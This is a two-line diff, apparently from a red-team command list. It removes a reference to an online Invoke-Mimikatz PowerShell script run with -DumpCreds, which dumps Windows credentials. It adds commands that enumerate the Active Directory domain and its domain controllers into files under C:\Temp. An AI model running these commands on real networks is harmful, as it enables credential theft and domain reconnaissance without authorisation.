@@ -1,1 +1,2 @@
-https://raw.githubusercontent.com/ThorbenPoe/Redteaming/main/scripts/Invoke-Mimikatz.ps1 -DumpCreds
+Get-ADDomain | Out-File C:\Temp\Domnain.txt
+Get-ADDomaincontroller | Out-File C:\Temp\DomnainC.txt
